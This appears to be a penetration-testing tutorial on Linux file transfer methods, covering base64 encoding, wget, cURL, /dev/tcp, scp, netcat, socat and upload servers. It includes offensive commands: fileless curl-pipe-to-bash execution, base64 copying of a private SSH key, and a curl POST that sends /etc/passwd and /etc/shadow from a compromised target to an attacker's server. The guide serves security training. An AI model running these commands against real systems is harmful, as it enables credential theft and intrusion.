# Linux File Transfer Methods

## Introduction

Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.

A few years ago, we were contacted to perform incident response on some web servers. We found multiple threat actors in six out of the nine web servers we investigated. The threat actor found a SQL Injection vulnerability. They used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.

The Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. Its first attempt was to use cURL. If that failed, it attempted to use wget, and if that failed, it used Python. All three methods use HTTP to communicate.

Although Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems uses HTTP and HTTPS for communication.

## Download Operations

### Base64 Encoding / Decoding

Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation.

**Check File MD5 Hash:**
```bash
md5sum id_rsa
# Output: 4e301756a07ded0a2dd6953abf015278  id_rsa
```

**Encode SSH Key to Base64:**
```bash
cat id_rsa | base64 -w 0; echo
# Output: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
```

**Decode the File:**
```bash
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...' | base64 -d > id_rsa
```

**Confirm the MD5 Hashes Match:**
```bash
md5sum id_rsa
# Output: 4e301756a07ded0a2dd6953abf015278  id_rsa
```

**⚠️ Note:** You can also upload files using the reverse operation. From your compromised target `cat` and `base64` encode a file and decode it on your attack machine.

### Web Downloads with Wget and cURL

Two of the most common utilities in Linux distributions to interact with web applications are `wget` and `curl`. These tools are installed on many Linux distributions.

**Download a File Using wget:**
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

**Download a File Using cURL:**
```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

**Common wget Options:**
- `-O` - Set output filename
- `-q` - Quiet mode (suppress output)
- `-c` - Continue partial downloads
- `-r` - Recursive download
- `--user-agent` - Set custom user agent

**Common cURL Options:**
- `-o` - Write output to file
- `-O` - Write output to file (use remote filename)
- `-s` - Silent mode
- `-L` - Follow redirects
- `-k` - Allow insecure SSL connections

### Fileless Attacks Using Linux

Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

**⚠️ Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

**Fileless Download with cURL:**
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

**Fileless Download with wget:**
```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

**Download and Execute Python Script:**
```bash
curl -s https://example.com/script.py | python3
```

**Download and Execute Bash Script:**
```bash
wget -qO- https://example.com/script.sh | bash
```

### Download with Bash (/dev/tcp)

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with `--enable-net-redirections`), the built-in `/dev/TCP` device file can be used for simple file downloads.

**Connect to the Target Webserver:**
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

**HTTP GET Request:**
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\nHost: 10.10.10.32\nConnection: close\n\n">&3
```

**Print the Response:**
```bash
cat <&3
```

**Complete Example:**
```bash
#!/bin/bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\nHost: 10.10.10.32\nConnection: close\n\n">&3
cat <&3 | sed '1,/^$/d' > LinEnum.sh
```

### SSH Downloads

SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.

**Setup SSH Server (if needed):**
```bash
# Enable SSH server
sudo systemctl enable ssh

# Start SSH server
sudo systemctl start ssh

# Check SSH is listening
netstat -lnpt | grep :22
```

**Download Files Using SCP:**
```bash
scp user@192.168.49.128:/root/myroot.txt .
scp user@192.168.49.128:/root/myroot.txt /tmp/myroot.txt
```

**Download Directory Using SCP:**
```bash
scp -r user@192.168.49.128:/root/scripts/ /tmp/
```

**Using SSH Key Authentication:**
```bash
scp -i ~/.ssh/id_rsa user@192.168.49.128:/root/file.txt .
```

### Alternative Download Methods

#### Python Downloads
```bash
# Python 3
python3 -c "import urllib.request; urllib.request.urlretrieve('http://example.com/file.txt', 'file.txt')"

# Python 2
python2 -c "import urllib; urllib.urlretrieve('http://example.com/file.txt', 'file.txt')"
```

#### Perl Downloads
```bash
perl -e 'use LWP::Simple; getstore("http://example.com/file.txt", "file.txt");'
```

#### Ruby Downloads
```bash
ruby -e 'require "net/http"; File.write("file.txt", Net::HTTP.get(URI("http://example.com/file.txt")))'
```

## Upload Operations

### Web Upload

We can use `uploadserver`, an extended module of the Python HTTP.Server module, which includes a file upload page. Let's configure the uploadserver module to use HTTPS for secure communication.

**Install uploadserver:**
```bash
sudo python3 -m pip install --user uploadserver
```

**Create a Self-Signed Certificate:**
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

**Start Web Server:**
```bash
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

**Upload Multiple Files:**
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

**Upload Single File:**
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/tmp/important.txt' --insecure
```

### Alternative Web File Transfer Method

Since Linux distributions usually have Python or PHP installed, starting a web server to transfer files is straightforward.

**Create Web Server with Python3:**
```bash
python3 -m http.server 8000
```

**Create Web Server with Python2.7:**
```bash
python2.7 -m SimpleHTTPServer 8000
```

**Create Web Server with PHP:**
```bash
php -S 0.0.0.0:8000
```

**Create Web Server with Ruby:**
```bash
ruby -run -ehttpd . -p8000
```

**Download File from Target Machine:**
```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

### SCP Upload

We may find some companies that allow the SSH protocol (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the scp utility to upload files.

**Upload File using SCP:**
```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

**Upload Directory using SCP:**
```bash
scp -r /tmp/scripts/ htb-student@10.129.86.90:/home/htb-student/
```

**Upload with SSH Key:**
```bash
scp -i ~/.ssh/id_rsa /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

### SFTP (SSH File Transfer Protocol)

SFTP provides a secure way to transfer files and can be used interactively or in batch mode.

**Interactive SFTP Session:**
```bash
sftp user@192.168.49.128
# sftp> put /tmp/file.txt
# sftp> get /remote/file.txt
# sftp> exit
```

**Batch SFTP Operations:**
```bash
# Create batch file
echo "put /tmp/file.txt" > sftp_batch.txt
echo "get /remote/file.txt" >> sftp_batch.txt

# Execute batch
sftp -b sftp_batch.txt user@192.168.49.128
```

### Netcat File Transfer

Netcat can be used for simple file transfers when other methods are not available.

**Setup Netcat Listener (Receiving End):**
```bash
nc -l -p 8000 > received_file.txt
```

**Send File via Netcat:**
```bash
nc 192.168.49.128 8000 < file_to_send.txt
```

**Transfer with Progress (using pv):**
```bash
# Sender
pv file_to_send.txt | nc 192.168.49.128 8000

# Receiver
nc -l -p 8000 | pv > received_file.txt
```

### Rsync File Transfer

Rsync is a powerful tool for synchronizing files and directories locally or over a network.

**Basic Rsync Usage:**
```bash
rsync -avz /local/path/ user@remote:/remote/path/
```

**Rsync over SSH:**
```bash
rsync -avz -e ssh /local/path/ user@remote:/remote/path/
```

**Rsync with Progress:**
```bash
rsync -avz --progress /local/path/ user@remote:/remote/path/
```

**Common Rsync Options:**
- `-a` - Archive mode (preserves permissions, timestamps, etc.)
- `-v` - Verbose output
- `-z` - Compress data during transfer
- `-r` - Recursive
- `--delete` - Delete files not present in source
- `--exclude` - Exclude patterns

## Advanced Techniques

### Using Socat for File Transfer

Socat is a more advanced version of netcat with additional features.

**Setup Socat Listener:**
```bash
socat TCP-LISTEN:8000,reuseaddr,fork OPEN:received_file.txt,creat
```

**Send File via Socat:**
```bash
socat TCP:192.168.49.128:8000 FILE:file_to_send.txt
```

### FTP File Transfer

When FTP is available and allowed through firewalls.

**Interactive FTP Session:**
```bash
ftp 192.168.49.128
# ftp> binary
# ftp> put localfile.txt
# ftp> get remotefile.txt
# ftp> bye
```

**Automated FTP with Script:**
```bash
#!/bin/bash
ftp -n 192.168.49.128 << EOF
user anonymous test123
binary
put localfile.txt
quit
EOF
```

### Using Git for File Transfer

Git can be used as an unconventional file transfer method when available.

**Clone Repository:**
```bash
git clone https://github.com/user/repo.git
```

**Create and Push Files:**
```bash
# Add files to local repo
git add .
git commit -m "File transfer"
git push origin main
```

## Security Considerations

### Encrypted File Transfer

Always prefer encrypted methods when possible:

**HTTPS over HTTP:**
```bash
curl -k https://example.com/file.txt -o file.txt
```

**SCP/SFTP over FTP:**
```bash
scp user@host:/path/file.txt .
```

**SSH Tunneling:**
```bash
ssh -L 8080:internal-server:80 user@jump-host
```

### File Integrity Verification

Always verify file integrity after transfer:

**MD5 Checksums:**
```bash
md5sum file.txt
```

**SHA256 Checksums:**
```bash
sha256sum file.txt
```

**Compare Checksums:**
```bash
# Generate checksum on source
md5sum original_file.txt > checksum.txt

# Verify on destination
md5sum -c checksum.txt
```

## Key Takeaways

1. **Multiple methods available** - Linux provides many built-in tools for file transfer
2. **Fileless operations** - Many tools support direct execution from memory
3. **Base64 encoding** - Useful for small files and restricted environments
4. **HTTP/HTTPS preferred** - Most commonly allowed through firewalls
5. **SSH/SCP** - Secure and widely supported for encrypted transfers
6. **Netcat versatility** - Simple but powerful for basic transfers
7. **Always verify integrity** - Use checksums to ensure successful transfers
8. **Consider security** - Prefer encrypted methods when possible

## References

- [cURL Manual](https://curl.se/docs/manpage.html)
- [Wget Manual](https://www.gnu.org/software/wget/manual/wget.html)
- [OpenSSH Manual](https://www.openssh.com/manual.html)
- [Netcat Guide](https://nmap.org/ncat/guide/)
- [Rsync Manual](https://rsync.samba.org/documentation.html)
- [Socat Manual](http://www.dest-unreach.org/socat/doc/socat.html) 